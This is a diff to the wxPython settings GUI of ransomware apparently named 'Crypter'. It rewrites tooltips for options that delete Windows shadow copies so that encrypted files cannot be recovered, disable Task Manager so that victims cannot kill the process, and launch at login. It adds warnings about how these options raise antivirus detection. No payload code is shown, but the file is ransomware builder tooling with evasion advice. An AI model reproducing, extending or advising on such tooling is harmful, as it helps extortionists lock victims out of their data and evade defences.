@@ -319,7 +319,7 @@ class MainFrame ( wx.Frame ):
 		
 		self.OpenGuiOnLoginLabel = wx.StaticText( sbSizer13.GetStaticBox(), wx.ID_ANY, u"Open GUI on Login", wx.DefaultPosition, wx.DefaultSize, 0 )
 		self.OpenGuiOnLoginLabel.Wrap( -1 )
-		self.OpenGuiOnLoginLabel.SetToolTipString( u"If ticked, the GUI will be launched each time the user logs in" )
+		self.OpenGuiOnLoginLabel.SetToolTipString( u"If ticked, the GUI will be launched each time the user logs in.\n\nWarning: Enabling this option may significantly increase the rate of Anti-Virus detection" )
 		
 		bSizer60.Add( self.OpenGuiOnLoginLabel, 0, wx.ALL, 5 )
 		
@@ -328,7 +328,7 @@ class MainFrame ( wx.Frame ):
 		
 		self.OpenGuiOnLoginCheckbox = wx.CheckBox( sbSizer13.GetStaticBox(), wx.ID_ANY, wx.EmptyString, wx.DefaultPosition, wx.DefaultSize, 0 )
 		self.OpenGuiOnLoginCheckbox.SetValue(True) 
-		self.OpenGuiOnLoginCheckbox.SetToolTipString( u"If ticked, the GUI will be launched each time the user logs in" )
+		self.OpenGuiOnLoginCheckbox.SetToolTipString( u"If ticked, the GUI will be launched each time the user logs in.\n\nWarning: Enabling this option may significantly increase the rate of Anti-Virus detection" )
 		
 		bSizer60.Add( self.OpenGuiOnLoginCheckbox, 0, wx.ALL, 5 )
 		
@@ -352,7 +352,7 @@ class MainFrame ( wx.Frame ):
 		
 		self.DeleteShadowCopiesLabel = wx.StaticText( sbSizer13.GetStaticBox(), wx.ID_ANY, u"Delete Shadow Copies", wx.DefaultPosition, wx.DefaultSize, 0 )
 		self.DeleteShadowCopiesLabel.Wrap( -1 )
-		self.DeleteShadowCopiesLabel.SetToolTipString( u"If ticked, all shadow copy files on the system will be deleted. These shadows are backup copies of the machine's files and can be used to gain access to the encrypted data without the decryption key.\n\nNote: This operation will fail silently if the user does not have sufficient privileges" )
+		self.DeleteShadowCopiesLabel.SetToolTipString( u"If ticked, all shadow copy files on the system will be deleted. These shadows are backup copies of the machine's files and can be used to gain access to the encrypted data without the decryption key.\n\nWarning: This operation will fail silently if the user does not have sufficient privileges" )
 		
 		bSizer2032131.Add( self.DeleteShadowCopiesLabel, 0, wx.ALL, 5 )
 		
@@ -361,7 +361,7 @@ class MainFrame ( wx.Frame ):
 		
 		self.DeleteShadowCopiesCheckbox = wx.CheckBox( sbSizer13.GetStaticBox(), wx.ID_ANY, wx.EmptyString, wx.DefaultPosition, wx.DefaultSize, 0 )
 		self.DeleteShadowCopiesCheckbox.SetValue(True) 
-		self.DeleteShadowCopiesCheckbox.SetToolTipString( u"If ticked, all shadow copy files on the system will be deleted. These shadows are backup copies of the machine's files and can be used to gain access to the encrypted data without the decryption key.\n\nNote: This operation will fail silently if the user does not have sufficient privileges" )
+		self.DeleteShadowCopiesCheckbox.SetToolTipString( u"If ticked, all shadow copy files on the system will be deleted. These shadows are backup copies of the machine's files and can be used to gain access to the encrypted data without the decryption key.\n\nWarning: This operation will fail silently if the user does not have sufficient privileges" )
 		
 		bSizer2032131.Add( self.DeleteShadowCopiesCheckbox, 0, wx.ALL, 5 )
 		
@@ -372,7 +372,7 @@ class MainFrame ( wx.Frame ):
 		
 		self.DisableTaskManagerLabel = wx.StaticText( sbSizer13.GetStaticBox(), wx.ID_ANY, u"Disable Task Manager", wx.DefaultPosition, wx.DefaultSize, 0 )
 		self.DisableTaskManagerLabel.Wrap( -1 )
-		self.DisableTaskManagerLabel.SetToolTipString( u"If ticked, Windows Task Manager will be disabled when Crypter is opened.\n\nNote: Whilst enabling this option helps prevent users from killing the executable, it can greatly increase the rate of Anti-Virus detection" )
+		self.DisableTaskManagerLabel.SetToolTipString( u"If ticked, Windows Task Manager will be disabled when Crypter is opened.\n\nWarning: Whilst enabling this option helps prevent users from killing the executable, it can greatly increase the rate of Anti-Virus detection" )
 		
 		bSizer20321112.Add( self.DisableTaskManagerLabel, 0, wx.ALL, 5 )
 		
@@ -380,7 +380,7 @@ class MainFrame ( wx.Frame ):
 		bSizer20321112.AddSpacer( ( 0, 0), 1, wx.EXPAND, 5 )
 		
 		self.DisableTaskManagerCheckbox = wx.CheckBox( sbSizer13.GetStaticBox(), wx.ID_ANY, wx.EmptyString, wx.DefaultPosition, wx.DefaultSize, 0 )
-		self.DisableTaskManagerCheckbox.SetToolTipString( u"If ticked, Windows Task Manager will be disabled when Crypter is opened.\n\nNote: Whilst enabling this option helps prevent users from killing the executable, it can greatly increase the rate of Anti-Virus detection" )
+		self.DisableTaskManagerCheckbox.SetToolTipString( u"If ticked, Windows Task Manager will be disabled when Crypter is opened.\n\nWarning: Whilst enabling this option helps prevent users from killing the executable, it can greatly increase the rate of Anti-Virus detection" )
 		
 		bSizer20321112.Add( self.DisableTaskManagerCheckbox, 0, wx.ALL, 5 )
 		
